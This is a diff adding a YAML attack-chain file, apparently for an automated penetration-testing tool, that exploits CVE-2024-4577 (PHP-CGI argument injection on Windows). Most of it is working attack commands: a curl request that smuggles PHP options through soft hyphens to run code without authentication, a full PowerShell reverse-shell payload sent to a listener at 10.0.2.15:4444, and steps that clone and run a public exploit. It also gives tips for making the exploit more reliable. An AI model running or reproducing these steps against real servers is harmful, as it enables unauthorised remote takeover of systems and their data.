@@ -1,0 +1,65 @@
+chain_id: php_cgi_cve_2024_4577
+title: "PHP-CGI — CVE-2024-4577 argument injection → unauth RCE (Windows)"
+severity: CRITICAL
+tags: [web, php, cgi, cve-2024-4577, argument-injection, rce, windows]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-4577" }
+    - { banner_pattern: "(?i)php(/|\\s|$)|x-powered-by:\\s*php" }
+    - { product_pattern: "(?i)php" }
+    - { path_pattern: "(?i)\\.php($|\\?)|/cgi-bin/.*php" }
+
+description: |
+  Windows + PHP in CGI mode (XAMPP default and many Asia-region hosts)
+  fail to handle the soft-hyphen (U+00AD) character before passing
+  args, letting `?-d` survive into the PHP CLI argv. Set
+  `allow_url_include=on` and `auto_prepend_file=php://input` and POST
+  PHP code → unauth RCE. Patches: 8.3.8, 8.2.20, 8.1.29.
+
+steps:
+  - id: 1
+    title: "Confirm PHP-CGI on Windows"
+    command: |
+      curl -sk -i "http://$VICTIMA/index.php" | grep -i 'php\\|server'
+      curl -sk "http://$VICTIMA/" -I | grep -i 'iis\\|x-powered-by'
+
+  - id: 2
+    title: "One-shot RCE — POST PHP body, soft-hyphen smuggling in URL"
+    command: |
+      curl -sk -X POST \
+        "http://$VICTIMA/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
+        -H 'Content-Type: application/x-www-form-urlencoded' \
+        -d '<?php system("whoami"); ?>'
+
+  - id: 3
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444
+      curl -sk -X POST \
+        "http://$VICTIMA/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
+        -d '<?php system("powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient(\\"10.0.2.15\\",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$h=$o+\\"PS \\"+(pwd).Path+\\"> \\";$x=(New-Object Text.ASCIIEncoding).GetBytes($h);$s.Write($x,0,$x.Length);$s.Flush()}\"") ?>'
+
+  - id: 4
+    title: "Public PoC + nuclei template"
+    command: |
+      git clone https://github.com/watchtowrlabs/CVE-2024-4577 /tmp/cve4577
+      python3 /tmp/cve4577/exploit.py -t http://$VICTIMA -c whoami
+      nuclei -u http://$VICTIMA -t http/cves/2024/CVE-2024-4577.yaml
+
+common_errors:
+  - error: "URL returns 200 but body is the raw PHP source"
+    solution: |
+      Apache + mod_php (not CGI) → not vulnerable. Confirm with
+      `Server: Apache` headers; the CGI variant usually shows
+      `Content-Type: text/html; charset=...` plus `php-cgi.exe` in
+      `Server` errors.
+  - error: "Server returns 500"
+    solution: |
+      Locale dependent — Chinese / Japanese / Traditional-Chinese
+      Windows installs are most reliably vulnerable. Try variants
+      with %E2%80%90 (U+2010 hyphen) instead of %AD.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-4577
+  - https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/
